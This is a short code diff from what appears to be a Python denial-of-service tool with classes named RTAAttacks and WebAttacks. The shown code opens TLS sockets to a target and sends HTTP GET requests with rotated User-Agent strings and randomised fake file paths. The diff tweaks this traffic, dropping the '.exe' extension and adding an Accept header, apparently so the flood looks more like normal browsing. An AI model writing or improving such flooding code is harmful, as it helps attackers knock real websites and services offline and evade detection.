@@ -214,7 +214,7 @@ class RTAAttacks:
                 s = context.wrap_socket(s, server_hostname=target)
             
             names = ['bebek', 'ayam', 'kucing', 'ikan', 'burung', 'sapi']
-            exts = ['.dat', '.jpg', '.png', '.zip', '.rar', '.exe']
+            exts = ['.dat', '.jpg', '.png', '.zip', '.rar']
             fake_file = f"/{random.choice(names)}_{random.randint(1000,9999)}{random.choice(exts)}"
             
             headers = (
@@ -284,6 +284,7 @@ class WebAttacks:
                 f"GET {random.choice(paths)} HTTP/1.1\r\n"
                 f"Host: {target}\r\n"
                 f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
+                f"Accept: */*\r\n"
                 f"Connection: close\r\n\r\n"
             )
             s.send(request.encode('utf-8'))
